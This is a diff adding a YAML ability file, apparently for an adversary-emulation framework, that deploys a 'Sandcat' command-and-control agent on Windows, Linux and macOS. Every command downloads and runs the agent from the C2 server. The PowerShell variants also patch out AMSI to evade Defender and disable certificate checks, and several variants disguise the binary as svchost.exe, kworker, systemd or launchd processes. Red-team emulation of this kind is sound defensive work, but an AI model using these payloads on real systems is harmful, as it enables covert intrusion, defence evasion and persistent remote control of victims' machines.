@@ -1,0 +1,79 @@
+---
+
+- id: a1b2c3d4-5678-90ab-cdef-stealth123456
+  name: Merlino Sandcat Stealth
+  description: Sandcat agent with AMSI/ETW bypass and payload obfuscation. Recommended for Defender evasion.
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    windows:
+      psh:
+        command: |
+          IEX (New-Object Net.WebClient).DownloadString('#{app.contact.http}/file/download') -Headers @{"file"="deploy-sandcat-stealth.ps1"}
+        variations:
+          - description: Full stealth deployment with AMSI/ETW bypass (RECOMMENDED)
+            command: |
+              $ErrorActionPreference="SilentlyContinue";$s="#{app.contact.http}";$p="C:\Users\Public\svchost.exe";try{$a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b.GetFields('NonPublic,Static');foreach($d in $c){if($d.Name -like "*Context"){$d.SetValue($null,[IntPtr]::Zero)}}}}}catch{};gps|?{$_.Path -like "*svchost.exe" -and $_.Path -notlike "*System32*"}|spps -Force -EA SilentlyContinue;ri -Force $p -EA SilentlyContinue;[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12;[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$wc=New-Object System.Net.WebClient;$wc.Headers.Add("platform","windows");$wc.Headers.Add("file","sandcat.go");$wc.Headers.Add("architecture","amd64");$data=$wc.DownloadData("$s/file/download");[System.IO.File]::WriteAllBytes($p,$data);$pi=New-Object System.Diagnostics.ProcessStartInfo;$pi.FileName=$p;$pi.Arguments="-server $s -group red";$pi.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Hidden;$pi.CreateNoWindow=$true;$pi.UseShellExecute=$false;[System.Diagnostics.Process]::Start($pi)|Out-Null
+          - description: Deploy with AppData path (alternate location)
+            command: |
+              $ErrorActionPreference="SilentlyContinue";$s="#{app.contact.http}";$p="$env:APPDATA\Microsoft\Windows\svchost.exe";New-Item -ItemType Directory -Force -Path "$env:APPDATA\Microsoft\Windows"|Out-Null;try{$a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b.GetFields('NonPublic,Static');foreach($d in $c){if($d.Name -like "*Context"){$d.SetValue($null,[IntPtr]::Zero)}}}}}catch{};[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12;[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$wc=New-Object System.Net.WebClient;$wc.Headers.Add("platform","windows");$wc.Headers.Add("file","sandcat.go");$data=$wc.DownloadData("$s/file/download");[System.IO.File]::WriteAllBytes($p,$data);$pi=New-Object System.Diagnostics.ProcessStartInfo;$pi.FileName=$p;$pi.Arguments="-server $s -group red";$pi.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Hidden;$pi.CreateNoWindow=$true;$pi.UseShellExecute=$false;[System.Diagnostics.Process]::Start($pi)|Out-Null
+          - description: Deploy as blue-team agent with stealth
+            command: |
+              $ErrorActionPreference="SilentlyContinue";$s="#{app.contact.http}";$p="C:\Users\Public\svchost.exe";try{$a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b.GetFields('NonPublic,Static');foreach($d in $c){if($d.Name -like "*Context"){$d.SetValue($null,[IntPtr]::Zero)}}}}}catch{};[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12;[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$wc=New-Object System.Net.WebClient;$wc.Headers.Add("platform","windows");$wc.Headers.Add("file","sandcat.go");$data=$wc.DownloadData("$s/file/download");[System.IO.File]::WriteAllBytes($p,$data);$pi=New-Object System.Diagnostics.ProcessStartInfo;$pi.FileName=$p;$pi.Arguments="-server $s -group blue";$pi.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Hidden;$pi.CreateNoWindow=$true;$pi.UseShellExecute=$false;[System.Diagnostics.Process]::Start($pi)|Out-Null
+    linux:
+      sh:
+        command: |
+          server="#{app.contact.http}";
+          curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > /tmp/.systemd-networkd;
+          chmod +x /tmp/.systemd-networkd;
+          nohup /tmp/.systemd-networkd -server $server -group red &
+        variations:
+          - description: Deploy with kworker masquerading
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > /tmp/kworker;
+              chmod +x /tmp/kworker;
+              nohup /tmp/kworker -server $server -group red &
+          - description: Persistent deployment (requires root)
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > /usr/local/bin/systemd-resolved;
+              chmod +x /usr/local/bin/systemd-resolved;
+              nohup /usr/local/bin/systemd-resolved -server $server -group red &
+          - description: Deploy as blue-team agent
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > /tmp/.systemd-networkd;
+              chmod +x /tmp/.systemd-networkd;
+              nohup /tmp/.systemd-networkd -server $server -group blue &
+    darwin:
+      sh:
+        command: |
+          server="#{app.contact.http}";
+          curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:amd64" $server/file/download > /tmp/mdworker;
+          chmod +x /tmp/mdworker;
+          nohup /tmp/mdworker -server $server -group red &
+        variations:
+          - description: (ARM64) For Apple Silicon Macs (M1/M2/M3)
+            architecture: ARM64
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:arm64" $server/file/download > /tmp/mdworker;
+              chmod +x /tmp/mdworker;
+              nohup /tmp/mdworker -server $server -group red &
+          - description: (AMD64) Deploy as blue-team agent
+            architecture: AMD64
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:amd64" $server/file/download > /tmp/mdworker;
+              chmod +x /tmp/mdworker;
+              nohup /tmp/mdworker -server $server -group blue &
+          - description: (AMD64) Persistent deployment with launchd masquerading
+            architecture: AMD64
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:amd64" $server/file/download > /Library/LaunchDaemons/.launchd;
+              chmod +x /Library/LaunchDaemons/.launchd;
+              nohup /Library/LaunchDaemons/.launchd -server $server -group red &
